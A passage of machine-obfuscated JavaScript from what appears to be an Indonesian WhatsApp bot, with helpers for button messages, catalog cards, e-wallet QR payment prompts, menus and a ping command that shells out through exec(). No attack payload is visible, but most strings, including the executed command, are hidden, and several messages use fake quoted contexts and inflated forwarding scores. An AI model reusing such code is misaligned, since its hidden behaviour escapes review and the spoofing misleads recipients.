_0x246353(_0x4b3cdc,_0x3477da,_0x2ea0f1,_0x3d2e00){return _0x4aaba1(_0x2ea0f1- -0xe9,_0x3477da,_0x2ea0f1-0x149,_0x3d2e00-0x1);}_0x2f1200['videoMessa'+'ge']=mhan[_0xc11cd7(-0x59b,0x3f3,-0xed,-0xde)][_0xc11cd7(0x38b,0x442,0x689,0x7d6)+'ge'],_0x2f1200[_0x246353(0x5fa,0x6ed,0x79d,0x75a)+'t']=_0x2bc731,_0x2f1200[_0xc11cd7(-0x2b6,0x3d9,0xd9,0x6c)]=_0x2ce1c0,_0x2f1200['buttons']=_0x95ff90,_0x2f1200[_0xc11cd7(0xdb,0x80f,0x6eb,0x590)]=0x5;const _0x487ef5=_0x2f1200;alpha[_0xc11cd7(0x70f,0x1ee,0xda,0x33a)+'e'](_0x6e6402,_0x487ef5,MessageType[_0x246353(0x7c7,0xadf,0x940,0x837)+_0xc11cd7(0x3a2,0x9a,0x3dc,-0x7b)],_0x1762ee);},sendButImage=async(_0x214716,_0x187176,_0x2eb157,_0x34d09f,_0x594b77=[],_0x13addd={})=>{const _0x23d29f={};_0x23d29f[_0x1d85d1(0xaae,0x9ac,0xad0,0xd8d)]='ephemeralM'+_0x1d85d1(0x792,0x54d,0xc72,0x495);const _0x33d19b=_0x23d29f;kma=_0x34d09f;const _0x3e700e=await alpha['prepareMes'+_0x1d85d1(0x1f9,0x618,0x282,-0xdf)](_0x214716,kma,MessageType[_0x1a1cc4(0x566,0x10d,0x8c2,0x538)],{'thumbnail':Buffer['alloc'](-0x1*0x1fa6+0x2*-0xf29+0x3df8)});mhan=_0x3e700e[_0x1a1cc4(0x9c8,0x44b,0x662,0x58c)][_0x33d19b['bBTBQ']]?_0x3e700e['message'][_0x1d85d1(0x61f,0x581,0x592,0x267)+_0x1d85d1(0x792,0x437,0xa19,0x2cc)]:_0x3e700e;const _0x2c0dae={};function _0x1d85d1(_0x9819c4,_0x59e3be,_0x43b364,_0x519c6f){return _0x406083(_0x9819c4- -0x2d1,_0x59e3be-0x8a,_0x43b364-0x51,_0x43b364);}_0x2c0dae[_0x1d85d1(0x460,0x600,0x578,0x301)+'ge']=mhan[_0x1a1cc4(0x87f,0x9f,0x494,0x58c)][_0x1a1cc4(0x544,0xc0f,0x332,0x856)+'ge'];function _0x1a1cc4(_0x346275,_0x38d158,_0x4f062e,_0x858870){return _0x4aaba1(_0x858870-0xf0,_0x38d158,_0x4f062e-0x198,_0x858870-0x82);}_0x2c0dae[_0x1a1cc4(0xaf1,0xb3e,0xd2f,0x976)+'t']=_0x187176,_0x2c0dae['footerText']=_0x2eb157,_0x2c0dae[_0x1d85d1(0x4cb,0x3dd,0x88,0x552)]=_0x594b77,_0x2c0dae[_0x1d85d1(0x804,0x659,0xa13,0x3f2)]=0x4;const _0x3f66d4=_0x2c0dae;alpha[_0x1a1cc4(0x543,0x8c1,0x71d,0x9a4)+'e'](_0x214716,_0x3f66d4,MessageType[_0x1d85d1(0x723,0xb05,0x505,0x260)+_0x1d85d1(0x1f9,-0x6a,-0x1f2,0xbb)],_0x13addd);};if(autoregister){if(autoregister===![])return;const _0x57a6dd={};_0x57a6dd[_0x406083(0x50e,0x18a,0x2cb,0xa08)+'t']='VERIFY';const _0x4b9cb4={};_0x4b9cb4[_0x4aaba1(0x78d,0x653,0xabc,0x63b)]='verify',_0x4b9cb4[_0x4aaba1(0x6e9,0xabe,0x732,0x509)]=_0x57a6dd,_0x4b9cb4[_0x4aaba1(0x816,0x3e8,0x7f1,0xb4f)]=_0x406083(0x4d8,0x41b,0x2cc,0x788);const _0x5f2b03={};_0x5f2b03['displayTex'+'t']=_0x406083(0x705,0x43c,0x25b,0x518)+'RIFY';const _0x129b81={};_0x129b81['buttonId']=_0x4aaba1(0x869,0xab3,0xb7f,0xc7e)+'ff',_0x129b81['buttonText']=_0x5f2b03,_0x129b81[_0x406083(0x7e1,0x724,0x8f1,0x5ca)]='RESPONSE';let gaklopo=[_0x4b9cb4,_0x129b81];if(isCmd&&!mek['key'][_0x406083(0xd3c,0xbae,0xeeb,0x124b)]&&!isOwner&&!isCreator&&!isRegister)return sendButMessage(from,_0x406083(0x5da,0x8fc,0x373,0x1ca)+sender[_0x406083(0x676,0x3fd,0x907,0x8bc)]('@')[0xdc3+-0x217f+0x13bc]+(_0x406083(0x829,0x310,0xbf6,0x6d2)+_0x4aaba1(0x6a4,0xa88,0x8f1,0x453)+_0x4aaba1(0x80f,0x72d,0x4e8,0x7b6)+_0x406083(0xb5b,0xfc5,0xffc,0xaf7)+_0x406083(0x709,0x6e3,0x549,0x6bc)+_0x406083(0x94c,0xa7c,0xa74,0x910)+'\x20akun\x20kamu'+_0x406083(0x5fd,0x39d,0x700,0x59d)+_0x4aaba1(0x43f,0x185,0x1ec,0x921)+'gan\x20cara\x20k'+'etik\x20@veri'+_0x4aaba1(0xc95,0xf2e,0x956,0xe9e)+_0x406083(0x5d2,0x9bc,0x59a,0x717)+_0x406083(0xcb3,0x1051,0x1020,0x91b)),botname+_0x406083(0x63f,0x9a1,0x404,0x344)+ownername,gaklopo,{'quoted':fgclink2,'contextInfo':{'mentionedJid':[sender]}});}const sendKatalog=async(_0x1759b9,_0x330de7,_0x250ff9)=>{const _0xfc9edc={'isRrg':_0x1259f5(0xb67,0x2d1,0xc1f,0x724)+_0x3d5167(0x89d,0xdd1,0x9b1,0x9ef)+_0x3d5167(0x89d,0xc85,0xa43,0xf04)+'sh1.jpg','TpzVt':'https://f.'+_0x3d5167(0x967,0x514,0x9b1,0x96a)+_0x3d5167(0x559,0xe4d,0x949,0xab9)+_0x3d5167(0x131,0x7c1,0x30e,0x207),'JOXZd':_0x3d5167(0xa83,0x826,0x609,0x4f4)+_0x3d5167(0xdab,0x4b1,0x9b1,0xb8d)+'/p_2068b7j'+_0x3d5167(0xd5b,0xe62,0xb65,0xcb9),'NTANS':function(_0x47a86d,_0x16cd66){return _0x47a86d(_0x16cd66);},'XeSrU':'0@s.whatsa'+_0x3d5167(0x871,0x43d,0x3b6,0x166),'buDUi':_0x3d5167(0x82e,0x416,0x913,0x664)+_0x3d5167(0x6cf,0x663,0x306,0x59f),'WsHIE':_0x1259f5(0x94a,0x7df,0x62f,0x690),'XPmFj':_0x3d5167(0x697,0x67c,0x97f,0xab0)};let _0x5ae1c0=[_0x1259f5(0x638,0x644,0xe43,0x98c)+'top4top.io'+_0x1259f5(0x109e,0x7a0,0x941,0xc07)+_0x3d5167(0xc0b,0x6c6,0x88e,0x526),_0xfc9edc[_0x1259f5(0x529,0x4af,0xb49,0x8d5)],_0xfc9edc[_0x1259f5(0x9cb,0xf19,0x7a7,0xca0)],_0xfc9edc['JOXZd'],_0x1259f5(0xcef,0x1166,0xb2b,0xdc6)+'top4top.io'+_0x3d5167(0x70,0x52f,0x337,0x2a7)+'2c1.jpg'];var _0x354756=_0x5ae1c0[Math[_0x3d5167(0x211,-0x7a,0x2b0,-0x18)](Math[_0x3d5167(0x9ef,0x77f,0x8cb,0x69c)]()*_0x5ae1c0[_0x1259f5(0xebd,0x9ab,0x71f,0x9e5)])];let _0x152ee1=await _0xfc9edc[_0x1259f5(0x924,0x2b3,0x946,0x759)](getBuffer,_0x354756);imeu=await alpha[_0x3d5167(0xe1,0x3c6,0x1c0,0x69c)+_0x1259f5(0x922,0x54c,0x224,0x718)](_0xfc9edc[_0x1259f5(0xa84,0xc0b,0xe93,0x9a4)],_0x152ee1,image,{'thumbnail':_0x152ee1}),imeg=imeu['message'][_0x3d5167(0x40c,0x75f,0x552,0x84c)+'ge'];const _0x37d132={};_0x37d132[_0x1259f5(0x8fe,0xec4,0xc35,0xb1b)+'ge']=imeg,_0x37d132[_0x1259f5(0xcfa,0x993,0x61a,0x7e1)]=_0xfc9edc['buDUi'],_0x37d132['title']=_0x1759b9,_0x37d132[_0x3d5167(0x21b,0x213,0x2fa,-0x154)+'n']=_0x250ff9;function _0x1259f5(_0x5c3b5d,_0xb59aa1,_0x4f14f4,_0x5af8e8){return _0x406083(_0x5af8e8-0x24e,_0xb59aa1-0x156,_0x4f14f4-0x1b6,_0x5c3b5d);}_0x37d132[_0x1259f5(0x104c,0xe41,0xd4e,0xc95)+'de']=_0xfc9edc['WsHIE'],_0x37d132['priceAmoun'+'t1000']=_0x330de7,_0x37d132['salePriceA'+_0x1259f5(0x1410,0x1062,0x114a,0xf7d)]=_0xfc9edc[_0x1259f5(0xc3a,0xcd7,0x104c,0xc87)],_0x37d132[_0x3d5167(0x880,0x9e8,0x6ee,0x4dc)+_0x3d5167(0x989,0xa1e,0xa22,0xdc3)]=0x1;const _0xa52aba={};_0xa52aba['forwarding'+'Score']=0x3,_0xa52aba[_0x1259f5(0x6ba,0xa73,0xeca,0xa71)+'d']=!![];const _0x548e1f={};_0x548e1f[_0x1259f5(0x15d,0x46c,0x353,0x5ee)]=_0x37d132;function _0x3d5167(_0xaddb66,_0x497016,_0x5ef94f,_0x5f33af){return _0x4aaba1(_0x5ef94f- -0x214,_0xaddb66,_0x5ef94f-0x1a1,_0x5f33af-0xe6);}_0x548e1f['businessOw'+_0x3d5167(0x3c6,0xbc0,0x733,0x5f7)]='6288743504'+_0x3d5167(0x654,0x894,0x70a,0x4e1)+_0x3d5167(0x281,0xa6f,0x5e1,0x22e),_0x548e1f[_0x1259f5(0xdbd,0xa8c,0xa72,0xaa0)+'o']=_0xa52aba;const _0x55dd67={};_0x55dd67[_0x1259f5(0xc5b,0xe17,0xa66,0x931)+_0x3d5167(0x66,-0x57,0x2eb,0x5ef)]=_0x548e1f;const _0x447f56={};_0x447f56[_0x3d5167(0xba4,0x75e,0xacf,0x85e)]=ftoko,_0x447f56[_0x1259f5(0xd07,0x74d,0x8ce,0xaa0)+'o']={},res=await alpha['prepareMes'+_0x3d5167(0x635,0x1e1,0x54e,0x122)+'ntent'](from,_0x55dd67,_0x447f56),alpha[_0x3d5167(0xc50,0x758,0x780,0xb55)+_0x1259f5(0x5dc,0x8f5,0xba8,0x718)](res);},sendImageMaker=async(_0x4cd4dc,_0x3ba256,_0x4623b9)=>{const _0x3e33ca={'BdNXT':function(_0x224998,_0x339bdf){return _0x224998(_0x339bdf);},'WpVlm':_0x28b805(0x342,0x3e2,0x2cb,0x228)+_0x4ece41(0x156,-0x38c,0x2fc,0x79)+'oba\x20bebera'+_0x28b805(0x781,0x7f9,0x30c,0x787)+'gi','wETue':_0x28b805(0x61e,0x7ac,0x921,0xb0c)+'essage','kABTM':_0x4ece41(0x93c,0xb4a,0xd79,0x9a9),'BFXcv':_0x28b805(0x188,0x26e,-0x1b1,-0x1b4),'vQQfj':_0x4ece41(0x5d9,-0xb6,-0x135,0x398)},_0x396997=await alpha[_0x4ece41(-0x209,-0xcb,0xf8,0x2b)+_0x4ece41(0x56e,0x489,-0x5e,0x156)](from,_0x4cd4dc,MessageType[_0x4ece41(-0x46a,0x148,0x4c9,0x9f)],{'thumbnail':Buffer[_0x4ece41(-0x70,0x6cd,0x44f,0x3c3)](0x19*0x163+-0x1713+-0x4*0x2e6)});function _0x28b805(_0x2985be,_0x415089,_0x202195,_0x4c0ed1){return _0x4aaba1(_0x2985be- -0x307,_0x202195,_0x202195-0xf3,_0x4c0ed1-0x77);}let _0x3d16ac=_0x396997[_0x28b805(0x195,-0x2e5,0x6ae,0x60d)][_0x3e33ca[_0x28b805(0xab2,0xe21,0x97f,0x964)]]?_0x396997[_0x28b805(0x195,0x2e,0x64a,-0xef)][_0x28b805(0x61e,0xa80,0x69f,0x99d)+_0x28b805(0x791,0x89c,0xa96,0x4a0)]:_0x396997;const _0x3f2061={};_0x3f2061['buttonId']=_0x3e33ca[_0x4ece41(-0x6d,0xbe,-0x1e1,0x30)],_0x3f2061[_0x28b805(0x3e2,-0x36,0xc6,0x7b9)]={},_0x3f2061[_0x4ece41(0x636,-0x17,0x669,0x46d)]=0x1,_0x3f2061[_0x28b805(0x3e2,-0x36,0xc6,0x7b9)][_0x28b805(0x23c,0x607,0x3aa,0x655)+'t']=_0x3e33ca[_0x4ece41(0x38d,0x4e8,0x3c7,0x327)];const _0x43461e={};_0x43461e[_0x28b805(0x23c,0x50f,-0x293,0x2b3)+'t']=_0x4ece41(0x5a9,0x65f,-0x325,0x1c0);const _0x71a4ec={};_0x71a4ec[_0x28b805(0x486,0x814,0x602,0x447)]=_0x3e33ca[_0x28b805(0x559,0x2f6,0x37c,0x109)],_0x71a4ec[_0x28b805(0x3e2,0x1f0,0x434,0x176)]=_0x43461e;function _0x4ece41(_0x34db70,_0x10e91c,_0x45490d,_0x185271){return _0x406083(_0x185271- -0x374,_0x10e91c-0x5b,_0x45490d-0x55,_0x10e91c);}_0x71a4ec[_0x4ece41(0x984,0x88e,-0xa5,0x46d)]=0x1;const _0xc4f3b=[_0x3f2061,_0x71a4ec],_0x274ce3={'contentText':_0x3ba256,'footerText':''+tampilTanggal+enter+tampilWaktu+enter+enter+'©\x20'+creator+(_0x28b805(0x1f3,0x82,0x57d,-0x157)+'\x20by\x20@')+_0x4623b9[_0x28b805(0x3a4,0x12d,0x362,0x59d)]('@')[-0x312+-0x1196*0x1+0x1*0x14a8],'buttons':_0xc4f3b,'headerType':0x4,'imageMessage':_0x3d16ac[_0x28b805(0x195,0xf9,0x597,0x4f9)]['imageMessa'+'ge']},_0x2905ef={};_0x2905ef[_0x28b805(0x586,0x2df,0xa47,0x43a)+'id']=[_0x4623b9];const _0x39d786={};_0x39d786['quoted']=mek,_0x39d786[_0x28b805(0x580,0x909,0x2d6,0x72c)+'o']=_0x2905ef,alpha[_0x28b805(0x5ad,0x537,0x7a0,0x670)+'e'](from,_0x274ce3,MessageType['buttonsMes'+_0x28b805(0x1f8,-0x300,0x495,0x6ce)],_0x39d786)['catch'](_0x51769b=>{function _0x16a88b(_0x2be555,_0x3c0b3c,_0x184329,_0x5c8205){return _0x4ece41(_0x2be555-0x10c,_0x2be555,_0x184329-0x1c8,_0x184329-0x465);}function _0x4d8b67(_0x4953af,_0x5869f3,_0x230a99,_0x284bf9){return _0x4ece41(_0x4953af-0xfb,_0x230a99,_0x230a99-0x109,_0x284bf9- -0x1a0);}_0x3e33ca[_0x4d8b67(0xb71,0x214,0x9fb,0x702)](reply,_0x3e33ca[_0x16a88b(0x81e,0xcb8,0xa10,0x5f1)]);});},send_qr_gopay=async(_0x2cdbfa,_0x5b9692)=>{function _0x31d8f1(_0x2c11d7,_0x94e0d5,_0x53655c,_0x13b192){return _0x4aaba1(_0x53655c- -0x286,_0x94e0d5,_0x53655c-0xea,_0x13b192-0x1a7);}ini_bayar=ucapannya2+(_0x3cf835(-0x139,0x464,0x675,0x2f2)+'\x20:\x20_')+pushname+(_0x31d8f1(0x74a,0x596,0x839,0xd01)+'\x20:\x20_@')+sender['split']('@')[-0x7*0x4ee+0x1*0xd01+0xf*0x16f]+(_0x31d8f1(0x9f0,0xaa9,0x5cb,0x795)+_0x3cf835(0x727,0x9a5,0x333,0x812)+_0x3cf835(-0x45,0x2ff,0x733,0x4e0)+_0x31d8f1(0x94,-0xb5,0x138,-0x28f)+'HP-mu.\x0a2.\x20'+_0x31d8f1(0x4d9,0x2be,0x252,-0xf3)+_0x31d8f1(0x87b,0x2f3,0x80b,0x6c4)+'\x20Scan\x20Barc'+_0x3cf835(0x878,0x41c,0x163,0x43d)+'\x20GOPAY.\x0a4.'+_0x3cf835(0xcda,0x99d,0xd2e,0xaa4)+_0x31d8f1(0x25f,0x270,0x747,0xab1)+'l\x20pembayar'+_0x3cf835(0x4f2,0x81e,0x9a6,0x57c)+_0x31d8f1(0x43f,0x1f8,0x663,0x69b)+_0x31d8f1(0x176,0x2c7,0x61e,0x63c))+ini_mark[_0x31d8f1(0x798,0x69b,0x425,0x15e)]('@')[-0x8fc+-0x3*-0x27e+-0x182*-0x1]+'_\x0a';const _0x156468={};function _0x3cf835(_0x488941,_0x18c595,_0x35f048,_0x1e1dac){return _0x406083(_0x1e1dac- -0x2e3,_0x18c595-0xbd,_0x35f048-0x11f,_0x488941);}_0x156468[_0x3cf835(0x4ce,0x3c3,0x776,0x575)+'id']=[sender,ini_mark],await alpha[_0x31d8f1(0x3e4,0x292,0x62e,0x137)+'e'](from,_0x2cdbfa,image,{'thumbnail':Buffer['alloc'](0x177c+0x1bae+0x110e*-0x3),'quoted':_0x5b9692,'caption':ini_bayar,'contextInfo':_0x156468});},send_qr_ovo=async(_0x4b0eef,_0xf78916)=>{function _0x28a367(_0x3309ab,_0x31a59c,_0x348bcc,_0x2b2e26){return _0x406083(_0x348bcc-0x217,_0x31a59c-0x117,_0x348bcc-0x1c4,_0x31a59c);}function _0x1fc7ad(_0x89778f,_0xbaab7f,_0x580727,_0x2250ee){return _0x4aaba1(_0xbaab7f-0xec,_0x2250ee,_0x580727-0xfe,_0x2250ee-0x85);}ini_bayar=ucapannya2+(_0x28a367(0x330,0x6d7,0x7ec,0x7a2)+'\x20:\x20_')+pushname+('_\x0a•>\x20Nomor'+_0x1fc7ad(0x9e8,0xb7f,0x833,0xe9f))+sender[_0x1fc7ad(0x275,0x797,0x6cc,0x641)]('@')[-0x27*-0x24+0x2485+-0x2a01*0x1]+('_\x0a\x0a\x0aCarany'+_0x28a367(0x91a,0x62e,0x8aa,0xb35)+_0x28a367(0x763,0x8a3,0xc2f,0x803)+_0x1fc7ad(0xad0,0xa05,0x862,0x909)+_0x28a367(0x94f,0x8ef,0x6d1,0x6cd)+_0x1fc7ad(0xd67,0x9eb,0xc0e,0xbc1)+_0x1fc7ad(0x1fb,0x642,0xa14,0x551)+_0x1fc7ad(0x8c0,0x53b,0xa4b,0x944)+_0x28a367(0xaab,0x313,0x746,0x22a)+_0x1fc7ad(0x10cf,0xe59,0xb36,0xf6e)+'n\x20Masukkan'+_0x28a367(0xc16,0xb50,0xd2f,0x8e7)+_0x1fc7ad(0xb59,0x8eb,0x77e,0x8b9)+'5.\x20Selesai'+_0x28a367(0x13bd,0xbab,0xea5,0xb30)+'@')+ini_mark['split']('@')[0xf*0x23c+-0x1d06+-0x47e]+'_\x0a';const _0x29dde7={};_0x29dde7[_0x28a367(0xd1c,0xa30,0xa6f,0xe99)+'id']=[sender,ini_mark],await alpha[_0x1fc7ad(0x54a,0x9a0,0xa86,0x7fd)+'e'](from,_0x4b0eef,image,{'thumbnail':Buffer[_0x1fc7ad(0xb72,0x858,0xc1d,0xa1c)](0x5c6*-0x1+-0x2420+0xad*0x3e),'quoted':_0xf78916,'caption':ini_bayar,'contextInfo':_0x29dde7});},send_qr_dana=async(_0x40a93e,_0x4ca340)=>{ini_bayar=ucapannya2+(_0x130d68(0x333,0x217,0x4c1,0x754)+_0x1d5e32(0x73a,0x594,0xa58,0x712))+pushname+(_0x1d5e32(0x7d3,0xbd9,0xea4,0xfa9)+'\x20:\x20_@')+sender[_0x1d5e32(0x8b8,0x7c5,0x95a,0x429)]('@')[-0xd*0x1f+0x4a*-0x61+0x1d9d]+(_0x1d5e32(0x8cf,0x96b,0x809,0x8a1)+_0x130d68(0x547,0x9e5,0x9e1,0xe41)+_0x1d5e32(0x631,0x912,0x51d,0x5fc)+_0x1d5e32(0x5eb,0xb10,0x9cb,0xff7)+_0x1d5e32(0x7ce,0x609,0x915,0x5cc)+'ilih\x20Pay\x20/'+_0x130d68(0x934,0x8f3,0x40d,0x1bc)+'Scan\x20Barco'+_0x1d5e32(0x29a,0x67e,0x362,0xb60)+_0x130d68(0x91e,0x10,0x4f5,0x9f0)+'an\x20Masukka'+_0x130d68(0x80c,0x6f0,0x892,0x75a)+_0x130d68(0x3af,0x636,0x85d,0x6bc)+_0x130d68(0x656,-0x12,0x515,0x58)+'i\x0a\x0a_Regard'+'\x20@')+ini_mark[_0x1d5e32(0x4e4,0x7c5,0x8f2,0x6e6)]('@')[0x18b3+0x1f76+-0x3829]+'_\x0a';const _0x265370={};function _0x130d68(_0x258453,_0x5b382b,_0x38b271,_0x294999){return _0x406083(_0x38b271- -0x114,_0x5b382b-0x166,_0x38b271-0x1f2,_0x294999);}_0x265370['mentionedJ'+'id']=[sender,ini_mark];function _0x1d5e32(_0xb2db15,_0x4854a3,_0x1c7621,_0x5ab10a){return _0x4aaba1(_0x4854a3-0x11a,_0x5ab10a,_0x1c7621-0x1dd,_0x5ab10a-0x171);}await alpha['sendMessag'+'e'](from,_0x40a93e,image,{'thumbnail':Buffer['alloc'](0x23a4+0x1e93+-0x4237),'quoted':_0x4ca340,'caption':ini_bayar,'contextInfo':_0x265370});},{quotesmenu,animemenu,coganmenu,helpmenu,convertmenu,funmenu,downloadmenu,makermenu,textpromenu,photooxymenu,telestiker,othermenu,ownermenu,set_stc_cmd,storagemenu,cecanmenu,tagmenu,upmenu,nsfwmenu,asupanmenu,image_effect,allmenu}=require(_0x406083(0x56d,0x5f8,0x754,0x264)+_0x4aaba1(0x669,0x7cc,0x3b6,0xb34)),isBtMsg=type==_0x406083(0x85e,0xac2,0x7d2,0xc6e)+_0x4aaba1(0x7a9,0x3a0,0xba9,0x2f7)+'ge'?mek[_0x4aaba1(0x49c,0x961,0x75a,0x5e1)][_0x406083(0x85e,0x463,0x7a4,0x8f4)+_0x406083(0x774,0x9e1,0x6e0,0xba9)+'ge'][_0x4aaba1(0x3a1,0x47f,0x487,0x756)+'splayText']:'',isStMsg=type==_0x406083(0x6b9,0x258,0x3de,0x56e)+_0x4aaba1(0xc2f,0xbff,0x10bf,0xfc3)?mek[_0x406083(0x467,0x691,0x69e,0x855)][_0x406083(0x6b9,0x67b,0x6b0,0x35d)+'seMessage'][_0x406083(0xa57,0xefd,0x6e2,0xac6)]:'',stc=mek[_0x406083(0x467,0x7e7,0x75e,0x646)][_0x4aaba1(0xc1c,0x750,0xef2,0xe99)+_0x4aaba1(0x4ff,0x5d3,0x374,0x404)],msc=mek['message'][_0x4aaba1(0x4ce,0x71a,0x2ec,0xbd)+'ge'];wew=fs[_0x406083(0x568,0xd9,0x74,0x4b8)+'nc']('image/'+thumbnail),alfa2='6288279575'+_0x4aaba1(0xd8a,0x11aa,0xfe2,0x117b)+'sapp.net',alfa3=_0x4aaba1(0x3a9,0x85c,0x7ee,0x367)+_0x4aaba1(0x80a,0x437,0x7a3,0x6db)+_0x406083(0x7ff,0xb67,0xd01,0x70f);if(msc){if(msc[_0x4aaba1(0x7c8,0x631,0x7ba,0x6b5)]==-0x17870+-0x2cb*-0x59+0x15f59){const _0xacda8e={};_0xacda8e['mentionedJ'+'id']=[alfa],_0xacda8e[_0x406083(0x8cf,0xaee,0xb75,0x952)+_0x406083(0x973,0xb11,0x627,0x4c0)]=0x3e7,_0xacda8e['isForwarde'+'d']=!![],alpha['sendMessag'+'e'](from,wew,image,{'thumbnail':fs[_0x406083(0x568,0x16f,0x448,0x335)+'nc'](_0x4aaba1(0x594,0x3d2,0x4f9,0x444)+thumbnail),'quoted':ftroli,'caption':help(prefix,hahh,pushname,ownername,status),'contextInfo':_0xacda8e,'sendEphemeral':!![]});}}if(stc){if(stc[_0x4aaba1(0x7c8,0x9c4,0x38e,0x391)]==''+cmd_stc_ping){console[_0x4aaba1(0x497,0x8bc,0x562,0x185)](color(time,'magenta'),color(moment['tz'](_0x406083(0x79b,0x37a,0x5a5,0xc8f)+'ta')['format'](_0x4aaba1(0x9d0,0x4b9,0xb4b,0xbd4)),_0x406083(0xc79,0xe06,0x7cf,0x858)),color(_0x406083(0xa37,0x6e4,0xb30,0x858)+'eed'));const timestamp=speed(),latensi=speed()-timestamp;exec(_0x4aaba1(0x9f5,0xb19,0xbd0,0x9e9)+_0x4aaba1(0xba9,0x7a4,0xf93,0x85b),(_0x1b2bde,_0x74cbe8,_0x896a29)=>{const _0x179ae5={};_0x179ae5['UXoBC']=_0x547720(0xac1,0x8c0,0xc70,0xdc2);const _0x8ebd1c=_0x179ae5;function _0x4334af(_0x4923fd,_0x2f529c,_0x2cc085,_0x28f689){return _0x406083(_0x4923fd- -0xfc,_0x2f529c-0x1c,_0x2cc085-0x191,_0x28f689);}function _0x547720(_0x52b2bf,_0x46a653,_0x3465c7,_0x1a51b9){return _0x4aaba1(_0x52b2bf-0x9b,_0x46a653,_0x3465c7-0x36,_0x1a51b9-0x1ac);}const _0x367949=_0x74cbe8[_0x4334af(0x7a1,0x3d7,0x752,0xac5)](_0x8ebd1c[_0x4334af(0x260,0x3b3,-0xe,-0x82)]),_0x29e34d=_0x367949[_0x4334af(0x924,0xb12,0x902,0xda0)](/Memory:/,_0x4334af(0x9d7,0x89c,0x7c7,0xb0f)),_0x1db7a7='*'+_0x29e34d+_0x547720(0xb14,0xa55,0x951,0xe2a)+latensi['toFixed'](-0x10e1+-0x2609+0x36ee)+_0x4334af(0x796,0xa9c,0xa3d,0x9e1);fakegroup(_0x1db7a7);});}}function _0x34ec(_0x40beea,_0x2a0d03){const _0x579281=_0x43e5();return _0x34ec=function(_0x2d4e28,_0x561fce){_0x2d4e28=_0x2d4e28-(0x1*-0x20af+0x1e35+0x441);let _0x262bd0=_0x579281[_0x2d4e28];return _0x262bd0;},_0x34ec(_0x40beea,_0x2a0d03);}stc&&(stc[_0x406083(0x793,0x91e,0x9b7,0x845)]==''+cmd_stc_menu&&(console[_0x4aaba1(0x497,0x56a,0x567,0x900)](color(time,'magenta'),color(moment['tz'](_0x406083(0x79b,0xb7b,0xac6,0x555)+'ta')['format'](_0x406083(0x99b,0x7a0,0x4cd,0xab9)),_0x4aaba1(0xcae,0xd56,0x95e,0x10f8)),color('Menampilka'+_0x4aaba1(0x93f,0xa23,0xa4f,0x450))),ini_thumbb=fs[_0x406083(0x568,0x996,0x4de,0x385)+'nc'](_0x4aaba1(0x594,0x743,0x318,0x7ae)+thumbnail),alpha[_0x4aaba1(0x8b4,0x8af,0xd79,0xd95)+'e'](from,ini_thumbb,image,{'thumbnail':fs[_0x406083(0x568,0x71,0x86a,0x6d)+'nc'](_0x406083(0x55f,0x8c0,0x6da,0x980)+thumbnail),'caption':allmenu(prefix,wita,wit,ucapannya2,timuu,status,wa_version,mcc,mnc,os_version,device_manufacturer,device_model,alfa,alfa1,thisDay,ini_tanggal,totalchat,hit_today,ini_gcchat),'contextInfo':{'text':allmenu(prefix,wita,wit,ucapannya2,timuu,status,wa_version,mcc,mnc,os_version,device_manufacturer,device_model,alfa,alfa1,thisDay,ini_tanggal,totalchat,hit_today,ini_gcchat),'forwardingScore':0x3b9aca00,'isForwarded':!![],'sendEphemeral':!![]},'quoted':ftoko})));if(stc){if(stc[_0x406083(0x793,0x6d7,0xae7,0x77c)]==''+cmd_stc_self){const pxvKqE=_0x4aaba1(0x5ea,0x6a1,0xa21,0x7b9)[_0x4aaba1(0x6ab,0x61f,0x5f1,0xb18)]('|');let OsiCIQ=-0x2*0xa5e+0x33*0x10+0x118c;while(!![]){switch(pxvKqE[OsiCIQ++]){case'0':console['log'](color(time,_0x406083(0xc2f,0xf59,0xb78,0xae4)),color(moment['tz']('Asia/Jakar'+'ta')[_0x4aaba1(0x6b0,0x5a4,0x87a,0x249)](_0x4aaba1(0x9d0,0xae3,0x85e,0xed2)),_0x4aaba1(0xcae,0x1060,0x9f9,0xaf0)),color('SELF\x20-\x20MOD'+'E'));continue;case'1':if(banChats===!![])return;continue;case'2':if(!mek[_0x4aaba1(0x488,0x73,0x1d6,0x598)][_0x406083(0xd3c,0x9bc,0xa39,0xfd1)]&&!isOwner&&!isCreator)return reply(lang[_0x4aaba1(0x639,0x3a3,0x7fa,0x318)]());continue;case'3':banChats=!![];continue;case'4':fakeitem(_0x4aaba1(0x650,0x461,0x75c,0x86d)+'DE*\x20」');continue;}break;}}}if(stc){if(stc[_0x406083(0x793,0x75a,0xc1c,0x40c)]==''+cmd_stc_public){const RxuMjq=_0x406083(0xba3,0xaf2,0xa40,0xb99)[_0x406083(0x676,0x3aa,0x2f4,0x703)]('|');let AFCooT=-0xeb3+-0x7b2*0x5+0x1*0x352d;while(!![]){switch(RxuMjq[AFCooT++]){case'0':banChats=![];continue;case'1':console[_0x4aaba1(0x497,0x1e6,0x971,0x441)](color(time,_0x406083(0xc2f,0xd93,0xef7,0xacc)),color(moment['tz'](_0x4aaba1(0x7d0,0x2e3,0x66c,0x81d)+'ta')['format'](_0x4aaba1(0x9d0,0xc03,0x989,0x6dc)),_0x406083(0xc79,0x7c7,0xb8b,0x1181)),color(_0x4aaba1(0xc3d,0xf2d,0x1047,0xf88)+_0x406083(0x984,0x7c4,0xa0c,0xd2c)));continue;case'2':if(!mek[_0x406083(0x453,0x7ab,0x59b,0x922)][_0x4aaba1(0xd71,0xf0b,0xd12,0x11ca)]&&!isOwner&&!isCreator)return reply(lang['onlyOwner']());continue;case'3':fakeitem(_0x406083(0x827,0x4fa,0xb57,0x32e)+_0x4aaba1(0xcc5,0xdc7,0xf2a,0xeec));continue;case'4':if(banChats===![])return;continue;}break;}}}if(stc){if(stc[_0x4aaba1(0x7c8,0x3a5,0x56f,0x9ca)]==''+cmd_stc_image_to_sticker){console[_0x406083(0x462,0x147,0x5f9,0x8b6)](color(time,_0x406083(0xc2f,0xea9,0xae6,0x714)),color(moment['tz']('Asia/Jakar'+'ta')[_0x4aaba1(0x6b0,0x515,0x536,0x99a)](_0x4aaba1(0x9d0,0xaae,0x8ae,0xb90)),'gold'),color(_0x4aaba1(0xb41,0x639,0xbfa,0xfe6)+_0x406083(0x4fb,0x81e,0x7ab,0x6be)+'CKER'));const 